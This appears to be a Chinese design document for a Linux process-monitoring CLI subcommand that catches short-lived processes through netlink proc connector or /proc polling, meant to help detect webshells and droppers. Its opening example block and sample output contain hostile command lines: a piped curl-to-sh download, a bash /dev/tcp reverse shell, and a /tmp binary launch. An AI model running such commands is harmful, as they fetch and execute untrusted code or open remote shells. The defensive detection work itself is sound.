# `karma local watch-proc`：短生命周期进程监听

## 目标

`ps`、`top` 都是一次性采样，运行几十毫秒的进程很容易落在两次采样之间：

```text
sh -c 'curl -s http://x/y.sh | sh'
bash -i >& /dev/tcp/... 0>&1
chmod +x /tmp/x && /tmp/x
```

这类进程是 webshell 执行、投放器、权限维持脚本的常见形态。需要一个持续监听新进程的
本地子命令，和 `local watch`（socket）配套使用。

## 命令形态

```bash
karma local watch-proc [--interval 50ms] [--duration 0] [--fork] [--poll]
```

## 两种数据源

### 1. proc connector（首选）

Linux 的 `NETLINK_CONNECTOR` + `CN_IDX_PROC` 会在进程 fork/exec/exit 时向监听者
推送事件，不需要轮询，能捕获存活时间极短的进程。

- 事件字段：pid、ppid、uid、gid、comm、exit_code
- 订阅后立即收到实时事件；不回溯启动前发生的事
- 需要内核 `CONFIG_PROC_EVENTS`、`CAP_NET_ADMIN`，并且监听者与目标在同一 PID 命名空间
- 收到事件后立刻读 `/proc/<pid>/cmdline`、`exe`、`cwd` 补齐细节；进程已退出时只能保留
  事件自带的 pid/ppid/uid/comm

在当前供应商容器里实测订阅会返回 `ECONNREFUSED`，且容器默认没有 `CAP_NET_ADMIN`，
所以这个目标上要依赖下面的轮询模式；换到宿主机或其他靶机时 connector 可能可用。

### 2. `/proc` 轮询（回退）

- 每 `--interval` 扫一次 `/proc/[0-9]*`
- 以 `pid + /proc/<pid>/stat` 的 starttime 作为键，避免 PID 复用误判
- 新键出现即认为新进程；读到 `cmdline`、`exe`、`ppid`、`uid`
- 间隔默认 50ms，最小 10ms；能覆盖绝大多数短进程，但比 interval 更短的仍可能漏掉

### 3. eBPF（后续可选）

`sched_process_fork` / `sched_process_exec` / `sched_process_exit` tracepoint 可以做到
零遗漏，但需要 root、BPF 支持和额外依赖，先不作为默认路径。

## 输出

```text
2026-11-25 15:10:02.113  exec  pid=4242 ppid=1 uid=0 comm=curl cmdline="curl -s http://198.51.100.25/x.sh"
2026-11-25 15:10:02.145  exit  pid=4242 ppid=1 uid=0 comm=curl code=0
```

默认只输出 `exec` 和 `exit`；`--fork` 追加 fork 事件，`--all` 连线程创建一起输出。
`cmdline` 用空格连接 `/proc/<pid>/cmdline` 的 NUL 分隔字段；读不到时省略该字段。

## 与 socket watch 联动

短命进程和短连接经常是同一件事的两面：

```text
15:10:02.113  exec  pid=4242 comm=curl cmdline="curl ..."
15:10:02.145  exit  pid=4242 comm=curl
15:10:02.146  tcp   TIME-WAIT 172.24.0.2:49812 -> 198.51.100.25:8443  pid=- comm=-
```

socket 进入 `TIME_WAIT` 时 fd 已关闭，反查不到 PID；进程事件正好补上 PID、comm 和
cmdline。两个 watcher 按时间、UID 关联，就能还原“哪个进程连了哪里”。

后续可以把两者合并成一个 `karma local watch --with-proc`，按时间线输出。

## 参数

| 参数 | 默认 | 说明 |
| --- | --- | --- |
| `--interval` | `50ms` | 轮询间隔，最小 10ms；connector 模式忽略 |
| `--duration` | `0` | 运行时长，0 表示直到 Ctrl-C |
| `--fork` | `false` | 输出 fork 事件 |
| `--all` | `false` | 输出 fork/exec/exit 全部事件，包含线程 |
| `--poll` | `false` | 强制使用 `/proc` 轮询，不尝试 connector |

## 局限

- 容器只能看到本 PID 命名空间内的进程；宿主机进程不可见。
- connector 需要 `CAP_NET_ADMIN`，非 root 或受限容器会自动回退到轮询。
- 轮询会漏掉比 interval 更短的进程；对 RST 类极短动作，必要时用 eBPF。
- `/proc/<pid>/cmdline`、`exe` 在进程退出后立即消失，事件里的 comm 仍可保留。
- 构建机、cron 密集的主机噪声大，建议按 UID、ppid、comm 过滤后再看。

## 代码落点（供后续实现）

- `internal/watch/proc.go`
  - 事件结构、去重键、格式化、时间线输出，跨平台可测
- `internal/watch/proc_linux.go`
  - raw netlink connector 订阅：`NETLINK_CONNECTOR`、`CN_IDX_PROC`、`CN_VAL_PROC`
  - 需要自己定义 `CN_IDX_PROC=1`、`CN_VAL_PROC=1`（x/sys/unix 只有 `NETLINK_CONNECTOR`）
- `internal/watch/proc_poll_linux.go`
  - `/proc` 快照、starttime 去重、cmdline/exe 读取
- `internal/watch/proc_other.go`
  - 非 Linux 返回 “process watch needs Linux /proc”
- `internal/cli/watchproc.go`
  - 定义 `karma local watch-proc` 和四个参数
- `internal/cli/commands.go`
  - 在 `newLocalCmd` 里注册

测试重点：基线不输出、新 PID 输出一次、PID 复用不误报、`--fork` 开关、退出后保留
comm、cmdline 读不到时省略、轮询模式与 connector 模式输出同一结构。